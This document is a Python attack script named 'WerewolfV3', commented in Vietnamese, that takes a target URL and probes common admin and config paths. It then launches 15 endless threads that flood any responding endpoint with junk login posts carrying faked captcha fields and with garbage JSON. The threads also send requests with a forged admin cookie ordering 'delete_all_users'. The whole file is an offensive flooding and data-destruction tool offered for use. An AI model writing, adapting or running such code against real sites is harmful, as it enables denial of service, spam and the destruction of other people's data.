import requests
import threading
import time
import random
import string
from colorama import Fore, init

init(autoreset=True)

class WerewolfV3:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.headers = {"User-Agent": "Mozilla/5.0 (Android 10; Mobile)"}
        self.valid_endpoints = [] # Những chỗ "vô được" sẽ nằm ở đây

    def rand_str(self, n=10):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

    # --- GIAI ĐOẠN 1: MÒ LỖ HỔNG TỪNG DÒNG (FUZZING) ---
    def find_vulnerabilities(self):
        print(f"{Fore.YELLOW}[*] Đang mò lỗ hổng ẩn (/dkkdk, /kì, /hdvdissd)...")
        # Danh sách đường dẫn từ bạn gợi ý và các ký tự ngẫu nhiên
        paths = ["/admin", "/assets/ajax/data.php", "/api/login", "/config.php", "/savehack.txt"]
        for _ in range(15): paths.append("/" + self.rand_str(random.randint(5, 15)))
        
        for p in paths:
            try:
                r = requests.get(self.target + p, timeout=1.5)
                if r.status_code < 400: # Nếu web không chặn (200, 403, 302)
                    print(f"{Fore.GREEN}[+] Phát hiện cửa hở: {p}")
                    self.valid_endpoints.append(self.target + p)
            except: pass

    # --- CHUỖI TẤN CÔNG 4 PHƯƠNG ÁN ---
    def attack_logic(self):
        while True:
            for url in self.valid_endpoints:
                try:
                    # PHƯƠNG ÁN 1: Tấn công đăng nhập (Có giả lập click chuột/robot)
                    payload_1 = {
                        "user": self.rand_str(), "pass": self.rand_str(),
                        "captcha_x": random.randint(10, 100), # Giả lập bấm đúng chỗ
                        "is_robot": "false" 
                    }
                    requests.post(url, data=payload_1, timeout=1)

                    # PHƯƠNG ÁN 2: Tấn công dữ liệu (Đổ rác JSON)
                    payload_2 = {"id": self.rand_str(20), "content": "TRASH_"*50}
                    requests.post(url, json=payload_2, timeout=1)

                    # PHƯƠNG ÁN 3 & 4: Hack Cookie & Xác minh Admin (Hủy diệt)
                    # Thử xóa dữ liệu để xem có thực sự là admin không
                    admin_cookie = {"admin_session": self.rand_str(32)}
                    res = requests.post(url, data={"action": "delete_all_users"}, cookies=admin_cookie, timeout=1)
                    
                    # Kiểm tra xem xóa thành công chưa như bạn yêu cầu
                    if res.status_code == 200 and "success" in res.text.lower():
                        print(f"{Fore.RED}[!!!] PHÂN QUYỀN ADMIN THÀNH CÔNG - DỮ LIỆU ĐÃ BIẾN MẤT")
                except:
                    pass
            
            # GIỮ CHO ĐIỆN THOẠI KHÔNG LAG (Mẹo quan trọng nhất)
            time.sleep(0.1) 

    def start(self):
        self.find_vulnerabilities()
        if not self.valid_endpoints: self.valid_endpoints.append(self.target)
        
        print(f"{Fore.CYAN}[>>>] ĐANG OANH TẠC TỔNG LỰC - ĐIỆN THOẠI MÁT MẺ...")
        # Chạy 15 luồng (Thread) để tấn công song song nhưng không tốn RAM
        for _ in range(15):
            t = threading.Thread(target=self.attack_logic)
            t.daemon = True # Chạy ngầm
            t.start()
        
        while True:
            print(f"\r{Fore.GREEN}[WEREWOLF] Trạng thái: Đang bắn rác | Máy: Cực mượt", end="")
            time.sleep(1)

if __name__ == "__main__":
    import sys
    link = sys.argv[1] if len(sys.argv) > 1 else input("Link: ")
    WerewolfV3(link).start()
                                 
